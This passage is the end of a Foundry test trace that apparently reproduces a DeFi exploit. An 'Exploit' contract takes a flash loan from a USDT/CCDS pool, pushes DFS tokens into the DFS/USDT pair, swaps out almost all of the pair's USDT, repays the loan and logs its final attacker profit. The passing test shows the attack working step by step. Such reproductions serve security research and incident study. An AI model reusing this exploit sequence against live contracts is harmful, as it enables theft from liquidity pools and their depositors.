    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 398264038265758515679232 [3.982e23])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   │   ├─ [3271] USDT::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 0)
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [649] dfs::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 398265536438933393348235 [3.982e23]
    │   │   │   ├─ emit log_named_decimal_uint(key: "[INFO]  dfs balance : address(this)", val: 398265536438933393348235 [3.982e23], decimals: 18)
    │   │   │   ├─ [8184] dfs::transfer(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], 378352259616986723680823 [3.783e23])
    │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xc4DE46a5C8fc7f57F07E232b465243A3Da3692f0, value: 1891761298084933618404 [1.891e21])
    │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], value: 378352259616986723680823 [3.783e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [649] dfs::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 18021515523861736049008 [1.802e22]
    │   │   │   ├─ emit log_named_decimal_uint(key: "[INFO]  address(this) balance (dfs token)", val: 18021515523861736049008 [1.802e22], decimals: 18)
    │   │   │   ├─ [531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ emit log_named_decimal_uint(key: "[INFO]  address(this) balance (usdt token)", val: 0, decimals: 18)
    │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   └─ ← [Return] 2925094224615117842940 [2.925e21]
    │   │   │   ├─ emit log_named_decimal_uint(key: "[INFO]  address(DFS_USDT_LP) balance (usdt token)", val: 2925094224615117842940 [2.925e21], decimals: 18)
    │   │   │   ├─ [38116] DFS_USDT_LP::swap(0, 2922169130390502725097 [2.922e21], Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x00)
    │   │   │   │   ├─ [23171] USDT::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2922169130390502725097 [2.922e21])
    │   │   │   │   │   ├─ emit Transfer(from: DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 2922169130390502725097 [2.922e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [771] Exploit::pancakeCall(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 2922169130390502725097 [2.922e21], 0x00)
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ [649] dfs::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 776815129078232594069715 [7.768e23]
    │   │   │   │   ├─ [531] USDT::balanceOf(DFS_USDT_LP: [0x4B02D85E086809eB7AF4E791103Bc4cde83480D1]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2925094224615117843 [2.925e18]
    │   │   │   │   ├─ emit Sync(reserve0: 776815129078232594069715 [7.768e23], reserve1: 2925094224615117843 [2.925e18])
    │   │   │   │   ├─ emit Swap(sender: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0In: 776616297882745239360055 [7.766e23], amount1In: 0, amount0Out: 0, amount1Out: 2922169130390502725097 [2.922e21], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 2922169130390502725097 [2.922e21]
    │   │   │   ├─ emit log_named_decimal_uint(key: "[INFO] payback amount usdt ", val: 2922169130390502725097 [2.922e21], decimals: 18)
    │   │   │   ├─ [3271] USDT::transfer(USDT_CCDS_LP: [0x2B948B5D3EBe9F463B29280FC03eBcB82db1072F], 1469859847869096716077 [1.469e21])
    │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: USDT_CCDS_LP: [0x2B948B5D3EBe9F463B29280FC03eBcB82db1072F], value: 1469859847869096716077 [1.469e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit log(val: "[INFO]  Flashloan payback success ")
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [531] USDT::balanceOf(USDT_CCDS_LP: [0x2B948B5D3EBe9F463B29280FC03eBcB82db1072F]) [staticcall]
    │   │   │   └─ ← [Return] 12184518673318714934263952 [1.218e25]
    │   │   ├─ [2952] ccds::balanceOf(USDT_CCDS_LP: [0x2B948B5D3EBe9F463B29280FC03eBcB82db1072F]) [staticcall]
    │   │   │   └─ ← [Return] 142106257693425836992696 [1.421e23]
    │   │   ├─ emit Sync(reserve0: 12184518673318714934263952 [1.218e25], reserve1: 142106257693425836992696 [1.421e23])
    │   │   ├─ emit Swap(sender: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0In: 1469859847869096716077 [1.469e21], amount1In: 0, amount0Out: 1462547112307558921470 [1.462e21], amount1Out: 0, to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   └─ ← [Stop] 
    │   ├─ [531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 1452309282521406009020 [1.452e21]
    │   ├─ emit log_named_decimal_uint(key: "[INFO]  usdt balance : this", val: 1452309282521406009020 [1.452e21], decimals: 18)
    │   └─ ← [Stop] 
    ├─ [531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 1452309282521406009020 [1.452e21]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDT Balance", val: 1452309282521406009020 [1.452e21], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 263.90ms (5.94ms CPU time)

Ran 2 test suites in 566.46ms (496.76ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
